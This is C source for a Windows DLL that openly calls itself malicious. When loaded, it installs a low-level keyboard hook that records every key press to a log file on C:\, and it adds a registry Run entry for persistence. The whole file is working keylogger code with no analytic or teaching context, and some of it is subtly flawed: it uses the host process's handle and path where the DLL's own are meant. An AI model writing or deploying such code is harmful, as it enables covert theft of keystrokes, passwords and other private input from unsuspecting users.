#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <psapi.h>

#define LOG_FILE "C:\\skelog.txt"

// Hook handle
HHOOK hKeyboardHook;

// Log the memory address where the DLL is injected
void LogDLLAddress() {
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule) {
        DWORD dwBaseAddress = (DWORD)hModule;
        FILE *file = fopen(LOG_FILE, "a");
        if (file) {
            fprintf(file, "DLL Base Address: 0x%lx\n", dwBaseAddress);
            fclose(file);
        }
    }
}

// Keyboard hook callback to log keys
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        FILE *file = fopen(LOG_FILE, "a");
        if (file) {
            fprintf(file, "Key: %d\n", pKeyboard->vkCode);
            fclose(file);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Set persistence in Windows Registry (Startup on login)
void SetPersistence() {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        char dllPath[MAX_PATH];
        GetModuleFileNameA(NULL, dllPath, MAX_PATH);
        RegSetValueExA(hKey, "MyMaliciousDLL", 0, REG_SZ, (const BYTE *)dllPath, strlen(dllPath) + 1);
        RegCloseKey(hKey);
    }
}

// DLL entry point for process attachment and detachment
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Log DLL base address
            LogDLLAddress();

            // Set keyboard hook
            hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hinstDLL, 0);
            if (hKeyboardHook == NULL) {
                return FALSE; // Hooking failed
            }

            // Set persistence in registry
            SetPersistence();
            break;

        case DLL_PROCESS_DETACH:
            // Unhook and clean up
            if (hKeyboardHook != NULL) {
                UnhookWindowsHookEx(hKeyboardHook);
            }
            break;
    }
    return TRUE;
}
